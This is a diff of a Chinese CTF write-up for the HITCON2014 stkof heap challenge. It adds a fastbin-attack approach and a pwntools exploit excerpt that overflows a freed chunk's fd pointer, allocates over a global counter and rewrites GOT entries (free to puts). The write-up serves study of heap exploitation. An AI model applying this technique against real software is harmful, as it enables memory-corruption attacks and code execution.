@@ -1,4 +1,4 @@
-# HITCON2014 stkof -温故知新unlink
+# HITCON2014 stkof -温故知新unlink 
 
 这题是HITCON2014中一道高分题，放到今天来看也就是考察普通的unlink利用。既然重新做了，就好好的写一下，省的以后再返工。废话不多说，具体来看一下。
 
@@ -222,9 +222,42 @@ PS2：如果unlink时，chunk3后是top chunk，chunk2 chunk3会和top chunk合�
 
 
 
+## 0x04 新解 fastbin attack
+
+20181203思路：申请fastbin的chunk2 chunk3 , free chunk3，堆溢出修改chunk3的fd，size伪造在&malloc_times，因此malloc两次就可以在&malloc_times+0x8处写。同样可以修改data中的指针。
+
+![image-20181203131924047](./img/image-20181203131924047.png)
 
 
 
+### diff exp.py exp-fastbin.py
 
+```python
+def pwn(io):
+    log.info("[1] malloc 0x30 times ")
+    # binary don't have setbuf , heap looks like : gets's chunk, first user malloc chunk, printf's chunk
+    create(0x400) # 1 first chunk in data[] number is 1 ;because ++malloc_times
+    
+    for i in range(0x2f):
+        create(0x20)
 
+    log.info("[2] free chunk3 , overflow chunk3'fd , fastbin attack ")
+    delete(3)
+    # gdb.attach(io,'break *0x400C85') # 0x0000000000400C85 atoi in main
+    payload = 0x28*"a" + p64(0x31) + p64(0x0000000000602100-8) 
+    input(2, len(payload), payload)
+    create(0x20) # 0x31
 
+    create(0x20) # 0x32
+
+    # gdb.attach(io,'break *0x400C85') # 0x0000000000400C85 atoi in main
+    log.success("fastbin attach success! we can arbitrary write now!")
+
+    log.info("[3] write puts@plt into free@got and call puts(puts@got)")
+    #                                         1               2                3               4 
+    payload2_globalptr = p64(0)*8  + p64(elf.got['free']) + p64(0xdeadbeaf) + p64(elf.got['puts']) + p64(0x400DEC) # //TODO
+    input(0x32, len(payload2_globalptr), payload2_globalptr)
+    [...]
+```
+
+![image-20181203134749112](./img/image-20181203134749112.png)
